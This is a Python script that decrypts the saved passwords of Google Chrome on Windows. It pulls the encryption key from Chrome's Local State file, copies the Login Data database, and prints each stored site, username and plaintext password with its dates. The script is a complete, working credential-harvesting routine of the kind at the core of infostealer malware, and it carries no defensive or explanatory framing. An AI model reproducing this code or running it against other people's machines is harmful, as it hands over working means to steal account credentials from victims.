import json
import base64
import os
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import sqlite3
import shutil


def get_chrome_datetime(chromedate):
    x = datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
    return x.strftime('%d-%m-%Y %H:%M:%S')


def get_encryption_key():
    local_state_path = r'C:\Users\{}\AppData\Local\Google\Chrome\User Data\Local State'.format(os.getlogin())
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
        
        
def extract_chrome_saved_passwords():
    list_of_data = []
    key = get_encryption_key()
    db_path = r'C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\Login Data'.format(os.getlogin())
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created,"\
        "date_last_used from logins order by date_created"
        )
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            list_of_data.append(f"Origin URL    : {origin_url}")
            list_of_data.append(f"Action URL    : {action_url}")
            list_of_data.append(f"Username      : {username}")
            list_of_data.append(f"Password      : {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            list_of_data.append(f"Creation Date : {get_chrome_datetime(date_created)}")
        if date_last_used != 86400000000 and date_last_used:
            list_of_data.append(f"Last Used     : {get_chrome_datetime(date_last_used)}")
        list_of_data.append("")
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    return "\n".join(list_of_data)


if __name__=='__main__':
    print(extract_chrome_saved_passwords())